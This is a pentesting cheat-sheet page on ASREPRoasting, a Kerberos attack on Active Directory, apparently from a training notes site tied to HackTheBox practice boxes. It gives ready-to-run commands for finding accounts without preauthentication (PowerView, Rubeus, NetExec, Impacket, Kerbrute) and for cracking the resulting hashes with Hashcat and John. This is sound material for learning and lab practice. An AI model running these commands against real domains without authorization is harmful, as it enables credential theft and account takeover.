---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# ASREPRoasting

## TL;DR&#x20;

**ASREPRoasting** is an attack on the initial Kerberos authentication step and it is usually performed **after obtaining a list of valid domain users**. If an account has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled then everyone can request from the DC to authenticate as that account and receive an **Authentication Service - Response (AS-REP)**. The AS-REP contains the **TGT** which is encypted with the account's password hash which, depending on its strength, can be potentially cracked.

<figure><img src="../../../../.gitbook/assets/kerberos_process.png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

## Windows <a href="#windows" id="windows"></a>

{% tabs %}
{% tab title="PowerView (UserEnum)" %}
{% code overflow="wrap" %}
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
{% endcode %}
{% endtab %}

{% tab title="Rubeus" %}
```powershell
.\Rubeus.exe asreproast /nowrap /format:hashcat
```
{% endtab %}
{% endtabs %}

## Linux <a href="#linux" id="linux"></a>

{% tabs %}
{% tab title="NetExec" %}
```bash
nxc ldap 10.10.10.161 -u users.lst -p '' --asreproast asreproast.lst
```
{% endtab %}

{% tab title="Impacket" %}
```bash
GetNPUsers.py DOMAIN/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users.lst
```
{% endtab %}

{% tab title="Kerbrute" %}
```bash
kerbrute userenum -d DOMAIN --dc 172.16.5.5 /opt/jsmith.txt 
```
{% endtab %}
{% endtabs %}

## Hash cracking

{% tabs %}
{% tab title="Hashcat" %}
```
hashcat -m 18200 user_hash /usr/share/wordlists/rockyou
```
{% endtab %}

{% tab title="John" %}
{% code overflow="wrap" %}
```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 asreproastable_users
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Practice

{% tabs %}
{% tab title="Forest (Easy)" %}
{% content-ref url="../../../../boxes/boxes/easy/forest.md" %}
[forest.md](../../../../boxes/boxes/easy/forest.md)
{% endcontent-ref %}
{% endtab %}

{% tab title="Sauna (Easy)" %}
{% content-ref url="../../../../boxes/boxes/easy/sauna.md" %}
[sauna.md](../../../../boxes/boxes/easy/sauna.md)
{% endcontent-ref %}
{% endtab %}

{% tab title="Blackfield (Hard)" %}
{% content-ref url="../../../../boxes/boxes/hard/blackfield.md" %}
[blackfield.md](../../../../boxes/boxes/hard/blackfield.md)
{% endcontent-ref %}
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="Kerberos" %}
{% embed url="https://blog.notso.pro/2020-05-07-offops-in-ad-0/" %}
A great article detailing each step of the Kerberos process.
{% endembed %}
{% endtab %}

{% tab title="GetNPUsers" %}
{% embed url="https://www.youtube.com/watch?v=pZSyGRjHNO4" %}
The workings of GetNPUsers script!
{% endembed %}
{% endtab %}

{% tab title="Demo" %}
{% embed url="https://www.youtube.com/watch?v=wA9w8t1fRWo" %}
ASREPRoasting in 10 minutes!
{% endembed %}
{% endtab %}
{% endtabs %}
